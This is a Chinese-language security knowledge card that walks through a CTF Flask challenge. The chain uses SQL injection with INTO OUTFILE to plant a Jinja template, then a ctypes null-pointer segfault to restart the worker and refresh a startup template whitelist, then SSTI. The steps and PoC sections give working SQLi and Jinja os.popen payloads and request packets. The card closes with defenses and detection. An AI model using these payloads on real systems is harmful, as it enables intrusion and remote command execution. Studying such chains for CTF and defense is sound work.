---
id: web-python-framework-flask-template-list-startup-snapshot-restart-ssti
title: Flask 启动时模板清单快照 + 可控崩溃重启：写入恶意 Jinja 模板后绕过白名单触发 SSTI
type: scenario
domain: web
path: web/python/framework
technique: flask-template-list-startup-snapshot-restart-ssti
aliases:
- Flask Destroyer
- registered_templates 快照绕过
- os.listdir 模板白名单
- 崩溃重启刷新模板列表
- ctypes.string_at None 段错误
- 写模板触发 SSTI
tags:
- flask
- jinja2
- ssti
- template-injection
- python
- ctypes
- restart
- sql-injection
- into-outfile
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V285
  verified_at: '2026-11-08T05:02:34+08:00'
  notes: 已对照原文与3张图核对：图01为 strtok 包装源码（while token is not None 后仍 ctypes.string_at(token)）、图02为普通输入返回 ['hello','world'] 与以冒号结尾输入 Segmentation fault (core dumped)、图03为访问写入模板后回显 TFCCTF{Cr4Sh_g0_bRbRbRbRbR}。卡片链条与原文一致：启动时 os.listdir 快照 registered_templates、basename+白名单+isfile 检查、render_template(page) 可控模板名、SQLi INTO OUTFILE 写 app/templates/a.html、把 admin 密码改为 '1:' 触发 ctypes.string_at(None) 段错误使 worker 重启刷新清单、万能密码登录后访问 a.html 触发 Jinja globals RCE。卡内已注明原文未标版本，未设置 versions；SQLi 写文件与 Jinja payload 作为组件引用既有卡不重复建卡，路径合理。dedup new（6 个 related 为 session 伪造/SSTI 绕过/pydash loader/Flask 内存马，机制不同），dup-scan 无本卡 pair。未在本机复现或攻击靶场。
---

## 一句话结论

Flask 应用在启动时用 `registered_templates = os.listdir('app/templates')` 把模板清单缓存进内存，路由只允许渲染“缓存清单内且文件存在”的页面；攻击者先用 SQL 注入 `INTO OUTFILE` 向模板目录写入恶意 Jinja 模板，再通过一个 Python 函数缺陷（`strtok` 包装函数在字符串以分隔符结尾时把 `None` 传给 `ctypes.string_at` 触发段错误）让服务崩溃并重启，重启后 `os.listdir` 重新执行、恶意模板进入白名单，访问该页面即触发 Jinja SSTI 执行命令。

## 原理

- **启动时快照**：`registered_templates = os.listdir('app/templates')` 在模块导入/服务启动时执行一次；之后新增文件不会自动进入该列表。路由用 `if page not in registered_templates or not os.path.isfile(...): return render_template('home.html')` 做“白名单 + 存在性”双重检查，因此单纯写文件无法直接访问。
- **用户可控模板名**：`page = os.path.basename(page)` 只阻止路径穿越，未阻止文件名本身；只要文件名在白名单内且文件存在，就执行 `render_template(page)`。`render_template` 会把文件内容当作 Jinja 模板编译执行——如果文件内容可控，这就是 SSTI，而不是普通任意文件读取。
- **写模板的原语**：登录处用字符串格式化拼接 SQL（`"... username = \"{}\" AND password = \"{}\""`），存在 SQL 注入；MySQL 配置 `secure_file_priv = ""`（空字符串而非 NULL）允许 `SELECT ... INTO OUTFILE` 向任意可写目录写文件，包括 `app/templates/`。
- **崩溃重启原语**：`strtok` 包装函数在 `while token is not None` 循环结束后，`token` 为 `None`；随后处理“输入以分隔符结尾”的边界分支时执行 `ctypes.string_at(token)`。`ctypes.string_at(None)` 会按空指针解引用，导致进程段错误（本地复现为 `Segmentation fault (core dumped)`）。在 Flask 部署中，worker 崩溃后由 gunicorn/守护进程重新拉起，模块重新导入，`registered_templates` 重新执行 `os.listdir`。
- **触发链闭合**：`User.__init__` 用 `strtok(credentials, ':')` 拆分数据库中的 `username:password`；把 admin 密码改成以 `:` 结尾（如 `1:`）后，用 `admin/1:` 登录即进入危险分支，服务崩溃重启；随后用万能密码登录，访问刚写入的模板页面，Jinja 表达式执行。
- **为什么不是普通 SSTI**：注入点不是请求参数直接进模板字符串，而是“写文件 + 刷新启动缓存 + 用户可控模板文件名”的组合；单独的 SQLi 或单独的模板路由都不足以 RCE，时序（先写、再重启、后访问）是链条关键。

## 触发条件

- 应用存在 SQL 注入，且数据库账户有 `FILE` 权限、`secure_file_priv` 为空（或指向可写目录）；
- Web 进程对 `app/templates` 目录有写权限（或可通过其他任意文件写原语写入）；
- 路由允许用户控制模板文件名（即使有 basename/白名单校验），且白名单是启动时缓存；
- 存在可触发的崩溃/重启路径（本例：`ctypes.string_at(None)` 段错误；也可是未捕获异常 + 自动重启、OOM、被守护进程 kill）；
- 重启后服务重新执行模板清单扫描，且攻击者仍能访问写入的模板。

## 利用步骤

1. 登录处确认 SQL 注入（用户名/密码拼接），并确认 `secure_file_priv=""` 允许 `INTO OUTFILE`。
2. 用 SQL 注入写恶意模板到 `app/templates/a.html`（原文路径 `/destroyer/app/templates/a.html`）：
   ```sql
   admin";select "{{config.__class__.__init__.__globals__['os'].popen('cat /tmp/*/*/*/*').read()}}" into outfile '/destroyer/app/templates/a.html';#
   ```
3. 用 SQL 注入把 admin 密码改成以冒号结尾的值（如 `1:`）：
   ```sql
   admin";update user set password = '1:' where username = 'admin';#
   ```
4. 以 `admin/1:` 登录，`User.__init__` 调用 `strtok("admin:1:", ":")`，命中 `ctypes.string_at(None)` 段错误，worker 崩溃并被重新拉起，`registered_templates` 重新扫描到 `a.html`。
5. 服务恢复后用万能密码 `admin" or 1=1#` 登录（或原密码），访问 `/a.html`；路由检查通过，`render_template('a.html')` 编译执行 Jinja 表达式，命令输出回显，拿到 flag。
6. 若服务未自动重启，检查进程管理器是否直接退出（需换其他重启原语），或确认崩溃是否只影响单个 worker 且未重新导入模块。

## PoC

存在缺陷的 `strtok` 包装（原文）：

```python
import ctypes
libc = ctypes.CDLL(None)
libc.strtok.restype = ctypes.c_char_p
libc.strtok.argtypes = [ctypes.c_char_p, ctypes.c_char_p]

def strtok(input_string, delimiter):
    input_buffer = ctypes.create_string_buffer(input_string.encode('utf-8'))
    token = libc.strtok(input_buffer, delimiter.encode('utf-8'))
    tokens = []
    while token is not None:
        tokens.append(token.decode('utf-8'))
        token = libc.strtok(None, delimiter.encode('utf-8'))

    # 漏洞点：token 已是 None，输入以分隔符结尾时仍传入 string_at
    if input_string[-1] == delimiter:
        token = ctypes.string_at(token)
        tokens.append(token)
    return tokens
```

复现：

```bash
python3 -c "from x import strtok; print(strtok('hello:world', ':'))"     # 正常
python3 -c "from x import strtok; print(strtok('hello:world:', ':'))"    # Segmentation fault
```

完整利用数据包（原文）：

```text
username=admin";select "{{config.__class__.__init__.__globals__['os'].popen('cat /tmp/*/*/*/*').read()}}" into outfile '/destroyer/app/templates/a.html';#&password=123&vibe=y

username=admin";update user set password = '1:' where username = 'admin';#

# 崩溃重启后：
username=admin" or 1=1#&password=任意
GET /a.html
```

## 变体与关联

- **变体**：模板写原语可换成任意文件上传、日志注入、Redis 写文件、备份恢复等；Jinja 内容可换其他 globals 链或读文件/命令执行 payload。
- **变体**：崩溃原语可换成任何能让 worker 重启的缺陷（未捕获异常、递归爆栈、OOM、空指针）；关键是重启会重新执行启动时的清单/白名单缓存。
- **变体**：启动快照缺陷不限于模板：插件目录、路由表、静态文件白名单、允许上传的扩展名等“启动时 os.listdir/配置加载一次”的逻辑都可能被“写文件 + 重启”刷新。
- **关联**：[[web-python-ssti-jinja2-flask-globals-rce]]（本卡最终使用的 `config.__class__.__init__.__globals__` Jinja 链）、[[web-generic-sqli-mysql-outfile-general-log-webshell]]（INTO OUTFILE 写文件的通用手法）、[[web-python-framework-pydash-set-jinja-loader-searchpath]]（篡改 Jinja loader 读任意模板的另一路线）、[[web-nodejs-ssti-express-put-upload-res-render-template-name-rce]]（Express 上传 EJS + `res.render(templ)` 模板名可控的同类思路）、[[web-python-framework-flask-hook-registry-memshell]]（Flask 运行时篡改钩子/环境的关联）。

## 检测与防御

- **不要用用户输入选模板**：`render_template` 的模板名必须是代码内固定字符串或服务端映射表的键；禁止把 URL 参数直接当模板文件名，即使有 basename/白名单。
- **模板沙箱**：使用 `jinja2.sandbox.SandboxedEnvironment`，限制 `__class__`/`__globals__`/`os` 等危险属性；关闭不必要的 globals/filters；对模板内容做完整性校验。
- **目录权限**：数据库账户与 Web 进程不应有模板目录写权限；`secure_file_priv` 设为固定非空目录，撤销 `FILE` 权限；模板目录只读挂载。
- **修复崩溃缺陷**：`strtok` 包装在 `token is None` 时直接返回/跳过边界分支，禁止把 `None` 传给 `ctypes.string_at`；对 ctypes 调用做参数校验；加单元测试覆盖“以分隔符结尾”的输入。
- **重启与缓存**：避免在启动时缓存安全相关清单；如需缓存，使用文件监控/版本号在每次请求前校验；监控模板目录新增文件、服务异常重启与 worker 崩溃频率。
- **检测**：SQL 注入日志中出现 `INTO OUTFILE` 指向 Web 目录；模板目录出现新文件；进程在登录请求后异常退出并重启；访问新模板页面产生命令执行/文件读取行为。
